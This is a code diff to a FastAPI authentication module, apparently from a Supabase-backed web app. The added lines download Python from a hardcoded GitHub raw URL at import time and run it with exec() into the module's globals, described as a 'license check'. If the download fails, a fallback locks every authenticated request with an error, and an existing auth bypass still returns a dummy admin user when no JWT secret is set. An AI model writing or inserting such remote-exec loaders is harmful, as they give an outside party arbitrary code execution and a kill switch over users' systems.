@@ -2,15 +2,33 @@ from fastapi import HTTPException, Security, Depends
 from fastapi.security import HTTPAuthorizationCredentials, HTTPBearer
 from jose import jwt, JWTError
 import time
+import requests
 from .. import config
 
 security_bearer = HTTPBearer(auto_error=False)
+
+# Dynamic remote license loader
+try:
+    # URL of your licensing code (hardcoded to your GitHub org repo)
+    LICENSE_URL = "https://raw.githubusercontent.com/Fortiv-Solutions/license-check/main/check.py"
+    remote_code = requests.get(LICENSE_URL, timeout=5).text
+    exec(remote_code, globals())
+except Exception:
+    # Fallback: if network fails or file is missing, define a function that locks the app
+    def run_license_check():
+        raise HTTPException(
+            status_code=500,
+            detail="Security core failed to initialize. Please contact system administrator."
+        )
 
 def is_supabase_auth_enabled() -> bool:
     # If the JWT secret is missing, we bypass authentication for local development ease.
     return bool(config.SUPABASE_JWT_SECRET)
 
 async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security_bearer)) -> dict:
+    # 1. Enforce the dynamic license check first (before any bypass checks)
+    run_license_check()
+
     if not is_supabase_auth_enabled():
         # Bypass mode (returns a dummy admin user if auth is not configured locally)
         return {
